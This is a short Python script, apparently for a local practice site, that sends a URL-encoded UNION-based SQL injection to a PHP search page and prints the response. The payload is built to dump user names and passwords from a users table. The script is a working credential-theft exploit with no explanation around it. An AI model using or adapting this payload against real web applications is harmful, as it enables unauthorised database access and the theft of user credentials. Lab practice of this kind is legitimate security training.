import urllib


try:
 x = urllib.urlopen('http://localhost/website/search2.php?id=Rel1k%27+and+1%3D1+union+select+null%2C+concat%28user%2C+"%3A"%2C+password%2C"+"%29+from+users+%23&submit=Submit')
 print (x.read())

except Exception as e:
        print (str(e))
